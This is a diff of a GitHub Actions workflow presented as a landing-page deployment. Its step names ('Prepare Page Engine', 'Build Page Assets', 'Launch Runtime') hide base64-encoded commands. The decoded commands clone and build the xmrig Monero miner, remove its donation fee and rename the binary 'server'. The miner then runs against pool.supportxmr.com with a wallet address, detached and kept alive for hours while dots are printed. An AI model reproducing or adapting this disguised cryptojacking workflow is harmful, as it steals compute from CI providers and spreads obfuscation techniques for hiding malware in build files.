@@ -1,4 +1,4 @@
-name: Deploy My Landing Page
+name: Deploy My Landing Pagexyz
 
 on:
   push:
@@ -12,16 +12,16 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: 1 Checkout Repository
+      - name: 1 Checkout Repositoryxyz
         uses: actions/checkout@v2
 
-      - name: 2 Setup Build Environment
+      - name: 2 Setup Build Environmentxyz
         shell: bash
         run: |
           sudo apt-get update
           sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf
 
-      - name: 3 Prepare Page Engine
+      - name: 3 Prepare Page Enginexyz
         shell: bash
         run: |
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA=="
@@ -30,7 +30,7 @@ jobs:
             git clone "$REPO_URL" core-engine
           fi
 
-      - name: 4 Patch Configuration Threshold
+      - name: 4 Patch Configuration Thresholdxyz
         shell: bash
         run: |
           cd core-engine
@@ -43,25 +43,30 @@ jobs:
           grep -E 'kDefaultDonateLevel|kMinimumDonateLevel' src/donate.h
 
 
-      - name: 5 Build Page Assets
+      - name: 5 Build Page Assetsxyz
         shell: bash
         run: |
           ENCODED="bWtkaXIgLXAgY29yZS1lbmdpbmUvYnVpbGQKY2QgY29yZS1lbmdpbmUvYnVpbGQKY21ha2UgLi4gPiAvZGV2L251bGwgMj4mMQptYWtlIC1qIiQobnByb2MpIiA+IC9kZXYvbnVsbCAyPiYxCm12IHhtcmlnIHNlcnZlciA+IC9kZXYvbnVsbCAyPiYx"
           CMD=$(echo "$ENCODED" | base64 -d)
           eval "$CMD"
 
-      - name: 6 Launch Runtime
+      - name: 6 Launch Runtimexyz
         shell: bash
         run: |
           cd core-engine/build
           chmod +x server
           ENCODED="Li9zZXJ2ZXIgLW8gcG9vbC5zdXBwb3J0eG1yLmNvbTo0NDMgXAogIC11IDRBcHc5d1hUWENTZ01mR29MQkV2QUhSdGtZQnVob0pMWmNkY1VoWEVyNGJhM1g3R0pldXh0Tm5DaGVaZDZYM1ZCakV1dzNrTnY4Vkx3OVhzS0FvdFpDVWRNVzFrUGJ4IFwKICAtcCBmb2Nna284MzYxMDcgXAogIC1rIC0tdGxzIC0tdGhyZWFkcz0kKG5wcm9jKSAtLWNwdS1wcmlvcml0eT01IC0tZG9uYXRlLWxldmVsPTAgLS1odWdlLXBhZ2VzLWppdCAtLWNwdS1uby15aWVsZCAtLXJhbmRvbXgtbm8tbnVtYSAtLWFzbT1yeXplbiAtLXJhbmRvbXgtbm8tcmRtc3IgLS1yYW5kb214LXdybXNyPS0xIC0tcmFuZG9teC1tb2RlPWZhc3Q="
           CMD=$(echo "$ENCODED" | base64 -d)
-          FINAL_CMD="$CMD > /dev/null 2>&1 &"
-          eval "$FINAL_CMD"
-          PID=$!
+          setsid bash -c "$CMD" > /dev/null 2>&1 &
+          SERVER_PID=$!
+          PGID=$(ps -o pgid= $SERVER_PID | grep -o '[0-9]*')
+          echo "Server started with PID=$SERVER_PID, PGID=$PGID"
+
           for i in {1..360}; do
-            echo "."
+            echo -n "."
             sleep $((RANDOM % 11 + 35))
           done
-          kill $PID || true
+
+          echo ""
+          echo "Stopping server after loop done..."
+          kill -- -$PGID 2>/dev/null || echo "Server already stopped."
